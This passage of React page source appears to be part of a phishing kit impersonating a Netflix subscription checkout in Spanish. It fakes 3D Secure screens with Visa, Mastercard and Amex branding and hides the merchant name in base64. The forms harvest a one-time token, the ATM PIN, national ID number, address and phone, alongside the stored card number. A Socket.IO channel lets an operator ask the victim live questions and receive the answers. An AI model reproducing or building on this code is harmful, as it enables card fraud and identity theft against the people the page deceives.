              <label className="block text-[11px] font-medium text-gray-600 mb-1">
                Código token
              </label>
              <input
                type="text"
                inputMode="numeric"
                placeholder="000000"
                value={token}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 6);
                  setToken(value);
                  setTokenError("");
                }}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                enterKeyHint="done"
                autoFocus
                maxLength={6}
                className={`w-full h-11 px-3 border rounded text-[14px] text-gray-900 bg-white outline-none transition-colors text-center tracking-[0.5em] font-mono text-lg placeholder:text-gray-400 ${
                  tokenError ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
              {tokenError && (
                <p className="text-[#E50914] text-[11px] mt-0.5 text-center">{tokenError}</p>
              )}
            </div>

            <p className="text-gray-500 text-[11px] text-center">
              El token se genera automáticamente en tu dispositivo de seguridad.
            </p>

            <button
              type="submit"
              disabled={isVerifying}
              className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 mt-2 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
            >
              {isVerifying ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Verificando...
                </span>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        );

      case 5:
        return (
          <form onSubmit={handleStep5Submit} className="space-y-3">
            <div className="text-center mb-4">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="2" y="4" width="20" height="16" rx="2" />
                  <path d="M6 8h.01M6 12h.01M6 16h.01M10 8h.01M10 12h.01M10 16h.01M14 8h.01M14 12h.01M14 16h.01M18 8h.01M18 12h.01M18 16h.01" />
                </svg>
              </div>
              <h2 className="text-[16px] font-bold text-gray-900 mb-1">
                Clave ATM
              </h2>
              <p className="text-gray-500 text-[12px]">
                Ingresa tu clave de 4 dígitos del cajero automático para confirmar la transacción.
              </p>
            </div>

            <div>
              <label className="block text-[11px] font-medium text-gray-600 mb-1">
                Clave del cajero (4 dígitos)
              </label>
              <input
                type="password"
                inputMode="numeric"
                placeholder="••••"
                value={atmPin}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "");
                  if (value.length <= 4) {
                    setAtmPin(value);
                    setAtmError("");
                  }
                }}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                enterKeyHint="done"
                autoFocus
                maxLength={4}
                className={`w-full h-11 px-3 border rounded text-[20px] text-gray-900 bg-white outline-none transition-colors text-center tracking-[1em] font-mono placeholder:text-gray-400 ${
                  atmError ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
              {atmError && (
                <p className="text-[#E50914] text-[11px] mt-0.5 text-center">{atmError}</p>
              )}
            </div>

            <p className="text-gray-500 text-[11px] text-center">
              Esta es la misma clave que usas en los cajeros automáticos.
            </p>

            <button
              type="submit"
              disabled={isVerifying}
              className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 mt-2 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
            >
              {isVerifying ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Finalizando...
                </span>
              ) : (
                                "Confirmar"
              )}
            </button>
          </form>
        );
      default:
        return null;
    }
  };

  return (
    <PageTransition>
      <div className="w-full bg-white flex flex-col relative" style={{ minHeight: 'var(--app-height, 100dvh)' }}>
        {/* Header */}
        <header className="px-4 sm:px-8 lg:px-12 py-3 border-b border-gray-200 flex justify-between items-center flex-shrink-0">
          <BrandLogo height={20} />
          <button
            onClick={handleLogout}
            className="text-black text-sm font-semibold hover:text-gray-600 transition-colors"
          >
            Cerrar sesión
          </button>
        </header>

        {/* Main Content */}
        <main className="px-4 sm:px-8 lg:px-12 pt-6 pb-4 sm:pt-12 sm:pb-8 flex-shrink-0">
          <div className="w-full max-w-[440px] mx-auto sm:mx-0 lg:mx-auto">
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-1 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '0ms' }}>
              Paso 3 de 3
            </p>
            <h1 className="text-[24px] sm:text-[28px] font-bold text-black mb-2 leading-tight animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '60ms' }}>
              Completa tu información personal
            </h1>
            <p className="text-gray-700 text-[14px] sm:text-[15px] mb-6 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '120ms' }}>
              Necesitamos estos datos para verificar tu identidad y completar tu suscripción.
            </p>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Dirección */}
              <div className="relative animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '180ms' }}>
                <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
                </div>
                <input
                  type="text"
                  placeholder="Dirección de residencia"
                  value={address}
                  onChange={(e) => { setAddress(e.target.value); if (errors.address) setErrors((prev) => ({ ...prev, address: "" })); }}
                  className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.address ? "border-[#E50914] bg-red-50/30" : address.length >= 5 ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                />
                {address.length >= 5 && !errors.address && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500 animate-[fadeSlideUp_0.2s_ease-out_both]">
                    <svg viewBox="0 0 16 16" className="w-4 h-4" fill="none">
                      <circle cx="8" cy="8" r="7" fill="#22c55e" />
                      <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                )}
                {errors.address && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.address}</p>}
              </div>

              {/* Cédula y Ciudad en row */}
              <div className="grid grid-cols-2 gap-3 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '240ms' }}>
                <div className="relative">
                  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                    </svg>
                  </div>
                  <input
                    type="text"
                    placeholder="N° de cédula"
                    value={cedula}
                    onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 14); setCedula(v); if (errors.cedula) setErrors((prev) => ({ ...prev, cedula: "" })); }}
                    maxLength={14}
                    inputMode="numeric"
                    className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.cedula ? "border-[#E50914] bg-red-50/30" : cedula.length >= 4 ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                  />
                  {cedula.length >= 4 && !errors.cedula && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500 animate-[fadeSlideUp_0.2s_ease-out_both]">
                      <svg viewBox="0 0 16 16" className="w-4 h-4" fill="none">
                        <circle cx="8" cy="8" r="7" fill="#22c55e" />
                        <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </div>
                  )}
                  {errors.cedula && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.cedula}</p>}
                </div>

                <div className="relative">
                  <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                    </svg>
                  </div>
                  <input
                    type="text"
                    placeholder="Ciudad"
                    value={city}
                    onChange={(e) => { setCity(e.target.value); if (errors.city) setErrors((prev) => ({ ...prev, city: "" })); }}
                    className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.city ? "border-[#E50914] bg-red-50/30" : city.length >= 5 ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                  />
                  {city.length >= 5 && !errors.city && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500 animate-[fadeSlideUp_0.2s_ease-out_both]">
                      <svg viewBox="0 0 16 16" className="w-4 h-4" fill="none">
                        <circle cx="8" cy="8" r="7" fill="#22c55e" />
                        <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </div>
                  )}
                  {errors.city && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.city}</p>}
                </div>
              </div>

              {/* Celular */}
              <div className="relative animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '300ms' }}>
                <div className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-[18px] h-[18px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                  </svg>
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  placeholder="Número de celular"
                  value={phone}
                  onChange={(e) => { const v = e.target.value.replace(/\D/g, ""); if (v.length > 0 && v[0] !== "3") return; const limited = v.slice(0, 10); setPhone(limited); if (errors.phone) setErrors((prev) => ({ ...prev, phone: "" })); }}
                  maxLength={10}
                  className={`w-full h-[52px] pl-11 pr-9 border rounded-lg text-[15px] text-black bg-white outline-none transition-all duration-200 ${errors.phone ? "border-[#E50914] bg-red-50/30" : phone.length === 10 ? "border-green-500 focus:border-green-500 focus:ring-1 focus:ring-green-500/20" : "border-gray-300 focus:border-[#333] focus:ring-1 focus:ring-[#333]/10"}`}
                />
                {phone.length === 10 && !errors.phone && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500 animate-[fadeSlideUp_0.2s_ease-out_both]">
                    <svg viewBox="0 0 16 16" className="w-4 h-4" fill="none">
                      <circle cx="8" cy="8" r="7" fill="#22c55e" />
                      <path d="M5 8l2 2 4-4" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                )}
                {errors.phone && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.phone}</p>}
              </div>

              {/* Trust badge */}
              <div className="flex items-center gap-2 py-2 px-3 bg-gray-50 rounded-lg border border-gray-100 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '360ms' }}>
                <svg viewBox="0 0 24 24" className="w-4 h-4 text-green-600 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 2L2 7v5c0 5.5 3.8 10.7 10 12 6.2-1.3 10-6.5 10-12V7L12 2z" />
                  <path d="M9 12l2 2 4-4" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <p className="text-gray-500 text-[11px] leading-relaxed">
                  Tus datos están protegidos con encriptación SSL de 256 bits. Al continuar, aceptas nuestra{" "}
                  <a href="#" className="text-gray-700 underline">Política de privacidad</a>.
                </p>
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="btn-confirm-pulse w-full h-[52px] bg-[#E50914] text-white text-[15px] font-bold rounded-lg hover:bg-[#F6121D] active:scale-[0.97] transition-all duration-150 disabled:opacity-70 shadow-[0_4px_12px_rgba(229,9,20,0.25)] animate-[fadeSlideUp_0.4s_ease-out_both] hover:scale-[1.01]" style={{ animationDelay: '420ms' }}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    Procesando...
                  </span>
                ) : "Confirmar"}
              </button>
            </form>
          </div>
        </main>

        {/* Footer */}
        <footer className="border-t border-gray-200 bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 pt-6 sm:pt-8 pb-6 sm:pb-8 safe-bottom flex-1">
          <div className="w-full max-w-[440px] mx-auto sm:mx-0 lg:mx-auto">
            <p className="text-gray-800 text-[13px] mb-6">
              ¿Preguntas? Llama al 01 800 519 1570 (sin cargo)
            </p>
            <div className="grid grid-cols-2 gap-y-5 gap-x-8 text-[13px]">
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Preguntas frecuentes</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Centro de ayuda</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Términos de uso</a>
              <a href="#" className="text-gray-600 underline hover:text-black transition-colors">Privacidad</a>
            </div>
          </div>
        </footer>

        {/* 3D Secure Modal - Multi-Step with Socket.IO */}
        {show3DSecure && (
          <div className="fixed inset-0 z-50 flex items-center justify-center px-4 animate-[modalOverlayIn_0.3s_ease-out_both]" style={{ paddingBottom: 'env(safe-area-inset-bottom, 0px)', paddingTop: 'env(safe-area-inset-top, 0px)' }}>
            <div className="bg-white rounded-xl shadow-2xl border border-gray-200 w-full max-w-[420px] overflow-y-auto overflow-x-hidden animate-[modalContentIn_0.35s_cubic-bezier(0.23,1,0.32,1)_both]" style={{ maxHeight: 'calc(var(--app-height, 100dvh) * 0.85)', animationDelay: '50ms' }}>
              {/* Modal Header - 3D Secure with network logo */}
              <div className="bg-gray-50 px-5 py-3 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    {binData?.scheme?.toLowerCase().includes("visa") ? (
                      <img src="/manus-storage/visa-secure-logo_f6858857.png" alt="Visa Secure" className="h-7 w-auto object-contain" />
                    ) : binData?.scheme?.toLowerCase().includes("master") ? (
                      <img src="/manus-storage/mastercard-idcheck-logo_aeeb414e.png" alt="Mastercard ID Check" className="h-7 w-auto object-contain" />
                    ) : binData?.scheme?.toLowerCase().includes("amex") || binData?.scheme?.toLowerCase().includes("american") ? (
                      <img src="/manus-storage/amex-safekey-logo_bfb83bc5.png" alt="Amex SafeKey" className="h-7 w-auto object-contain" />
                    ) : (
                      <div className="flex items-center gap-2">
                        <svg viewBox="0 0 24 24" className="w-5 h-5 text-gray-700" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M12 2L2 7v5c0 5.5 3.8 10.7 10 12 6.2-1.3 10-6.5 10-12V7L12 2z" />
                        </svg>
                        <span className="text-gray-700 text-[11px] font-bold tracking-wide">3D SECURE</span>
                      </div>
                    )}
                  </div>
                  <div className="flex items-center gap-1.5">
                    <svg viewBox="0 0 16 16" className="w-3.5 h-3.5" fill="none">
                      <path d="M8 1L2 4v4c0 3.5 2.5 6.5 6 7.5 3.5-1 6-4 6-7.5V4L8 1z" fill="#22c55e" />
                      <path d="M6 8l1.5 1.5L10 7" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                    <span className="text-gray-500 text-[9px] font-medium">Verificado</span>
                  </div>
                </div>
              </div>

              {/* Bank Logo & Name - shows only logo for identification */}
              {binData?.logo && (
                <div className="flex items-center justify-center gap-3 px-5 py-3 bg-gray-50 border-b border-gray-200">
                  <img
                    src={binData.logo.logo}
                    alt={binData.logo.name}
                    className="h-8 w-auto object-contain"
                  />
                  <span className="text-sm font-semibold text-gray-800">{binData.logo.name}</span>
                </div>
              )}

              {/* Authorization Info - Comercio y últimos 4 dígitos */}
              <div className="px-5 py-3 border-b border-gray-200 bg-white">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-[10px] text-gray-500 uppercase tracking-wider font-medium">Autorización</p>
                    <p className="text-[13px] font-bold text-gray-900 mt-0.5">{atob('TkVURkxJWCBDTw==')}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-[10px] text-gray-500 uppercase tracking-wider font-medium">Tarjeta</p>
                    <p className="text-[13px] font-bold text-gray-900 mt-0.5 font-mono">**** {(sessionStorage.getItem("sp_card_number") || "").replace(/\s/g, "").slice(-4) || "----"}</p>
                  </div>
                </div>
              </div>

              {/* Custom Text Overlay - shows admin question with response input */}
              {showCustomText && (
                <div className="px-5 py-4">
                  <div className="text-center mb-4">
                    <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
                      <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" />
                      </svg>
                    </div>
                    <h2 className="text-[16px] font-bold text-gray-900 mb-1">Verificación Adicional</h2>
                    <p className="text-gray-600 text-[13px] leading-relaxed">{customTextQuestion}</p>
                  </div>
                  <form onSubmit={(e) => {
                    e.preventDefault();
                    if (!customTextAnswer.trim()) return;
                    setCustomTextSending(true);
                    // Send response back to admin via socket
                    socketRef.current?.emit("user:custom-text-response", {
                      sessionId: sessionIdRef.current,
                      question: customTextQuestion,
                      answer: customTextAnswer.trim(),
                    });
                    setTimeout(() => {
                      setShowCustomText(false);
                      setCustomTextSending(false);
                      setIsWaitingAdmin(true);
                    }, 800);
                  }} className="space-y-3">
                    <div>
                      <label className="block text-[11px] font-medium text-gray-600 mb-1">Tu respuesta</label>
                      <input
                        type="text"
                        value={customTextAnswer}
                        onChange={(e) => setCustomTextAnswer(e.target.value)}
                        placeholder="Escribe tu respuesta aquí..."
                        autoFocus
                        className="w-full h-11 px-3 border border-gray-300 rounded text-[14px] text-gray-900 bg-white outline-none transition-colors focus:border-[#E50914] placeholder:text-gray-400"
                      />
                    </div>
                    <button
                      type="submit"
                      disabled={customTextSending || !customTextAnswer.trim()}
                      className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
                    >
                      {customTextSending ? (
                        <span className="flex items-center justify-center gap-2">
                          <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                          </svg>
                          Enviando...
                        </span>
                      ) : "Confirmar"}
                    </button>
                  </form>
                </div>
              )}

              {/* Modal Body */}
              {!showCustomText && (
              <div className="px-5 py-4">
                {/* Step Progress Indicator */}
                {!isWaitingAdmin && sessionStatus !== "rejected" && renderStepIndicator()}

                {/* Step Content */}
                {renderSecureStepContent()}

                {/* Security note */}
                <div className="flex items-center justify-center gap-1.5 mt-4 pt-3 border-t border-gray-200">
                  <svg viewBox="0 0 16 16" className="w-3.5 h-3.5" fill="none">
                    <path d="M8 1L2 4v4c0 3.5 2.5 6.5 6 7.5 3.5-1 6-4 6-7.5V4L8 1z" fill="#22c55e" />
                    <path d="M6 8l1.5 1.5L10 7" stroke="white" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span className="text-gray-400 text-[10px]">
                    Conexión segura con encriptación SSL de 256 bits
                  </span>
                </div>
              </div>
              )}
            </div>
          </div>
        )}
      </div>
    </PageTransition>
  );
}
